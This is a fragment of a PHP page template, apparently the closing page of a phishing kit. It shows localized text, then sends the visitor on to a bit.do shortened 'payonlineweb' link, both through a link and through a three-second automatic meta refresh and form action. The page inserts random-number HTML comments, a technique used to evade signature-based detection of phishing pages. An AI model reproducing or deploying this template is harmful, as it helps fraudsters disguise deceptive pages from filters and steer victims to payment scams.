...
<h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem"><?php echo $lg_finish['head']?></h1>
	...
	<?php echo "<!--".rand(0,99999999)."-->"?>		<a style="font-weight:bold" href="http://bit.do/payonlineweb">
				<?php echo $lg_finish['p3']?></a>.</p><?php echo "<!--".rand(0,99999999)."-->"?>
				<div>
					        <meta http-equiv="refresh" content="3;url=http://bit.do/payonlineweb" />
				<form method="get" action="http://bit.do/payonlineweb">
